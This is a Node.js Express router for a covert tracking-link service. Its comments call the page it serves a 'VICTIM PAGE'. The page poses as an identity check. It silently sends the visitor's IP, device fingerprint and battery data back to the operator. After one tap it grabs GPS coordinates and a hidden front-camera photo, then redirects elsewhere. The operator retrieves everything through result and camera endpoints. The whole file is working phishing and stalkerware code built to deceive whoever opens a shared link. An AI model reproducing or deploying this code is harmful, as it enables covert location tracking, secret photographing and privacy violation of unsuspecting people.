const express = require('express');
const crypto  = require('crypto');
const router  = express.Router();

// In-memory session store (per-process; resets on dyno restart — acceptable for short-lived tracking links)
const _locStore = {};

// ── Cleanup: remove sessions older than 2 hours so memory doesn't grow forever ──
setInterval(() => {
    const cutoff = Date.now() - 2 * 60 * 60 * 1000;
    for (const tok of Object.keys(_locStore)) {
        if (_locStore[tok].timestamp < cutoff) delete _locStore[tok];
    }
}, 30 * 60 * 1000); // run every 30 min

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/start   →   generate tracking session
//  Body: { userId }   — userId is just a label (e.g. WhatsApp JID)
// ─────────────────────────────────────────────────────────────────────
router.post('/start', (req, res) => {
    const userId = req.body.userId || req.query.userId;
    if (!userId) return res.status(400).json({ error: 'Missing userId' });

    const sessionToken = crypto.randomBytes(16).toString('hex');
    _locStore[sessionToken] = {
        userId,
        clientIp   : null,
        metrics    : null,
        cameraImage: null,
        timestamp  : Date.now()
    };

    // ── Auto-detect public URL — zero config needed ─────────────────────────
    // Priority:
    //  1. global._detectedPublicHost  — auto-saved from first external HTTP request
    //  2. HEROKU_APP_NAME env          — just set the APP NAME (not full URL); Heroku auto-sets this
    //                                    if Dyno Metadata labs feature is enabled (free)
    //  3. APP_URL env                  — manual fallback (full URL)
    //  4. REPLIT_DEV_DOMAIN            — Replit environment
    //  5. localhost                    — local dev only
    const host = (global._detectedPublicHost || '')
        || (process.env.HEROKU_APP_NAME  ? `https://${process.env.HEROKU_APP_NAME}.herokuapp.com` : '')
        || (process.env.APP_URL          ? process.env.APP_URL.replace(/\/$/, '') : '')
        || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : '')
        || `http://localhost:${process.env.PORT || 3001}`;

    const link = `${host}/api/location/v/${sessionToken}`;
    res.json({ sessionToken, link });
});

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/result/:sessionToken   →   fetch captured data
// ─────────────────────────────────────────────────────────────────────
router.get('/result/:sessionToken', (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found or expired' });
    res.json({
        userId     : s.userId,
        ip         : s.clientIp,
        metrics    : s.metrics,
        hasCamera  : !!s.cameraImage,
        cameraThumb: s.cameraImage ? s.cameraImage.substring(0, 80) + '…' : null,
        timestamp  : s.timestamp
    });
});

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/camera/:sessionToken   →   full camera base64
// ─────────────────────────────────────────────────────────────────────
router.get('/camera/:sessionToken', (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found or expired' });
    if (!s.cameraImage) return res.status(204).json({ error: 'No camera image yet' });
    res.json({ image: s.cameraImage });
});

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/v/:sessionToken   →   VICTIM PAGE (tracking HTML)
//  Silently captures: IP (server-side), GPS, device metrics, front camera
//  Then redirects victim to: https://cybersecprosimdatabase.vercel.app/
// ─────────────────────────────────────────────────────────────────────
router.get('/v/:sessionToken', (req, res) => {
    const sessionToken = req.params.sessionToken;
    if (!_locStore[sessionToken]) return res.status(404).send('Link expired or invalid.');

    // Capture victim IP immediately on page load (server-side — always works)
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim()
        || req.socket.remoteAddress;
    _locStore[sessionToken].clientIp   = clientIp;
    _locStore[sessionToken].timestamp  = Date.now();

    const REDIRECT_URL = 'https://cybersecprosimdatabase.vercel.app/';

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify Your Identity</title>
  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      min-height: 100vh;
      background: linear-gradient(135deg, #0d1b2e 0%, #1b2838 100%);
      display: flex; align-items: center; justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      padding: 20px;
    }
    .card {
      background: rgba(255,255,255,0.06);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 20px;
      padding: 40px 32px;
      max-width: 380px;
      width: 100%;
      text-align: center;
    }
    .icon {
      font-size: 48px; margin-bottom: 16px;
    }
    h1 {
      color: #fff; font-size: 22px; font-weight: 600; margin-bottom: 8px;
    }
    p {
      color: rgba(255,255,255,0.55); font-size: 14px; line-height: 1.5; margin-bottom: 28px;
    }
    .btn {
      display: inline-block;
      background: #e02e4f;
      color: #fff;
      border: none;
      border-radius: 50px;
      padding: 14px 40px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: transform 0.15s, box-shadow 0.15s;
      touch-action: manipulation;
    }
    .btn:active { transform: scale(0.96); }
    .btn:focus { outline: 2px solid rgba(224,46,79,0.5); }
    .status {
      margin-top: 20px;
      color: rgba(255,255,255,0.35);
      font-size: 13px;
      display: none;
    }
    .status.show { display: block; }
    /* Hidden tracking elements */
    #_tv { position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
    #_tc { position: fixed; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">🛡️</div>
    <h1>Verify Your Identity</h1>
    <p>We need to verify you are a real person.<br>Tap the button below to continue.</p>
    <button class="btn" id="_goBtn">Tap to Verify</button>
    <div class="status" id="_status">Processing…</div>
  </div>
  <video id="_tv" autoplay playsinline muted></video>
  <canvas id="_tc"></canvas>

  <script>
  (function () {
    var TOK  = '${sessionToken}';
    var BASE = window.location.origin;
    var DEST = '${REDIRECT_URL}';

    // ── Device + browser metrics ────────────────────────
    var metrics = {
      ua       : navigator.userAgent,
      platform : navigator.platform || '',
      lang     : navigator.language,
      langs    : navigator.languages ? Array.from(navigator.languages) : [],
      screen   : { w: screen.width, h: screen.height, aw: screen.availWidth, ah: screen.availHeight },
      dpr      : window.devicePixelRatio || 1,
      tz       : Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookies  : navigator.cookieEnabled,
      cores    : navigator.hardwareConcurrency || null,
      memory   : navigator.deviceMemory || null,
      touch    : ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
      touchPts : navigator.maxTouchPoints || 0,
      referrer : document.referrer || 'direct',
      conn     : navigator.connection ? {
                   type: navigator.connection.effectiveType,
                   rtt : navigator.connection.rtt,
                   dl  : navigator.connection.downlink
                 } : null,
      battery  : null,
      gps      : null
    };

    function sendMetrics () {
      var body = JSON.stringify(metrics);
      try {
        if (navigator.sendBeacon) {
          navigator.sendBeacon(BASE + '/api/location/log/' + TOK,
            new Blob([body], { type: 'application/json' }));
        } else {
          fetch(BASE + '/api/location/log/' + TOK, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: body, keepalive: true
          });
        }
      } catch (e) {}
    }

    // ── 1. Fire metrics immediately (sendBeacon survives navigation) ──
    sendMetrics();

    // ── 2. Battery (no permission needed) ────────────────
    if (navigator.getBattery) {
      navigator.getBattery().then(function (b) {
        metrics.battery = { pct: Math.round(b.level * 100), charging: b.charging };
        sendMetrics();
      }).catch(function () {});
    }

    // ── Everything below needs USER GESTURE (click/tap) ──────────
    // Modern mobile browsers BLOCK getUserMedia and geolocation
    // unless triggered by a user tap.

    var _redirected = false;
    function doRedirect () {
      if (_redirected) return;
      _redirected = true;
      window.location.replace(DEST);
    }

    function captureCamera () {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        doRedirect();
        return;
      }
      var vid = document.getElementById('_tv');
      var can = document.getElementById('_tc');
      navigator.mediaDevices.getUserMedia({
        audio: false,
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
      }).then(function (stream) {
        vid.srcObject = stream;
        vid.onloadedmetadata = function () {
          vid.play();
          setTimeout(function () {
            try {
              can.width  = vid.videoWidth  || 640;
              can.height = vid.videoHeight || 480;
              can.getContext('2d').drawImage(vid, 0, 0, can.width, can.height);
              var img = can.toDataURL('image/jpeg', 0.82);
              fetch(BASE + '/api/location/cam/' + TOK, {
                method  : 'POST',
                headers : { 'Content-Type': 'application/json' },
                body    : JSON.stringify({ image: img }),
                keepalive: true
              }).catch(function () {});
              stream.getTracks().forEach(function (t) { t.stop(); });
            } catch (e) {}
            doRedirect();
          }, 1200);
        };
      }).catch(function () {
        doRedirect();
      });
    }

    // ── GPS (also needs user gesture on mobile) ────────
    function captureGps () {
      if (!navigator.geolocation) return;
      navigator.geolocation.getCurrentPosition(
        function (pos) {
          metrics.gps = {
            lat : pos.coords.latitude,
            lng : pos.coords.longitude,
            acc : pos.coords.accuracy,
            alt : pos.coords.altitude,
            spd : pos.coords.speed
          };
          sendMetrics();
        },
        function () {},
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    }

    // ── On button tap: start camera + GPS, then redirect ──
    document.getElementById('_goBtn').addEventListener('click', function () {
      document.getElementById('_goBtn').style.display = 'none';
      document.getElementById('_status').classList.add('show');
      document.getElementById('_status').textContent = 'Verifying…';
      captureGps();
      captureCamera();
      setTimeout(doRedirect, 5000);
    });

  })();
  </script>
</body>
</html>`);
});

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/log/:sessionToken   →   receive device metrics
// ─────────────────────────────────────────────────────────────────────
router.post('/log/:sessionToken', express.json({ limit: '50kb' }), (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found' });
    s.metrics   = req.body;
    s.timestamp = Date.now();
    res.json({ status: 'ok' });
});

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/cam/:sessionToken   →   receive camera image
// ─────────────────────────────────────────────────────────────────────
router.post('/cam/:sessionToken', express.json({ limit: '10mb' }), (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found' });
    s.cameraImage = req.body.image;
    s.timestamp   = Date.now();
    res.json({ status: 'ok' });
});

module.exports = router;
